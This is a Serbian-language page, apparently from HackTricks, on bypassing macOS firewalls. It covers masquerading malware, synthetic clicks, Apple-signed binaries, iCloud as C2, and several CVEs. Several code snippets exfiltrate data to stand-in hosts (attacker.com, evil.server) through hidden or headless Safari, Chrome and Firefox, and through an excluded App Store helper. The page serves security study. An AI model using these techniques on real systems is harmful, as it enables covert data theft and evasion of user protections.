# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su pronađene kao funkcionalne u nekim macOS firewall aplikacijama.

### Zloupotreba imena na beloj listi

- Na primer, pozivanje malvera sa imenima dobro poznatih macOS procesa kao što su **`launchd`**

### Sintetički Klik

- Ako firewall traži dozvolu od korisnika, naterajte malver da **klikne na dozvoli**

### **Koristite Apple potpisane binarne datoteke**

- Kao **`curl`**, ali i druge kao što su **`whois`**

### Dobro poznate apple domene

Firewall bi mogao da dozvoli veze sa dobro poznatim apple domenama kao što su **`apple.com`** ili **`icloud.com`**. I iCloud bi mogao biti korišćen kao C2.

### Opšti Bypass

Neke ideje za pokušaj zaobilaženja firewalla

### Proverite dozvoljeni saobraćaj

Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno domene na beloj listi ili koje aplikacije imaju dozvolu da im pristupe.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

DNS rezolucije se vrše putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem aplikacija u pregledaču

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem injekcija procesa

Ako možete **injektovati kod u proces** koji ima dozvolu da se poveže sa bilo kojim serverom, mogli biste zaobići zaštitu vatrozida:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne ranjivosti za zaobilaženje macOS vatrozida (2023-2025)

### Zaobilaženje filtera web sadržaja (Screen Time) – **CVE-2024-44206**
U julu 2024. Apple je ispravio kritičnu grešku u Safari/WebKit koja je prekinula sistemski “filter web sadržaja” koji koriste roditeljske kontrole Screen Time.
Posebno oblikovana URI (na primer, sa dvostruko URL-enkodiranim “://”) nije prepoznata od strane Screen Time ACL, ali je prihvaćena od strane WebKit-a, tako da se zahtev šalje nefiltriran. Bilo koji proces koji može otvoriti URL (uključujući sandboxed ili nesiguran kod) može stoga pristupiti domenama koje su eksplicitno blokirane od strane korisnika ili MDM profila.

Praktični test (sistem bez ispravki):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) pravilo-redosled greška u ranoj macOS 14 “Sonoma”
Tokom beta ciklusa macOS 14, Apple je uveo regresiju u korisničkom prostoru oko **`pfctl`**.
Pravila koja su dodata sa `quick` ključnom rečju (koju koriste mnogi VPN kill-switch-evi) su tiho ignorisana, uzrokujući curenje saobraćaja čak i kada je VPN/firewall GUI izvestio *blokirano*. Greška je potvrđena od strane nekoliko VPN dobavljača i ispravljena u RC 2 (build 23A344).

Brza provera curenja:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Zloupotreba Apple-ovih potpisanih pomoćnih usluga (legacy – pre-macOS 11.2)
Pre macOS 11.2 **`ContentFilterExclusionList`** je omogućavao ~50 Apple binarnih datoteka kao što su **`nsurlsessiond`** i App Store da zaobiđu sve socket-filter vatrozidove implementirane sa Network Extension okvirom (LuLu, Little Snitch, itd.).
Malver je mogao jednostavno da pokrene isključeni proces—ili da ubrizga kod u njega—i da tuneluje svoj sopstveni saobraćaj preko već dozvoljenog soketa. Apple je potpuno uklonio listu isključenja u macOS 11.2, ali je tehnika i dalje relevantna na sistemima koji ne mogu biti nadograđeni.

Primer dokaza koncepta (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Saveti za alate za moderni macOS

1. Istražite trenutna PF pravila koja generišu GUI vatrozidi:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Nabrojite binarne datoteke koje već imaju *outgoing-network* pravo (korisno za piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programatski registrujte svoj vlastiti Network Extension sadržajni filter u Objective-C/Swift.
Minimalni rootless PoC koji prosleđuje pakete na lokalni soket dostupan je u izvoru **LuLu** Patricka Wardlea.

## Reference

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
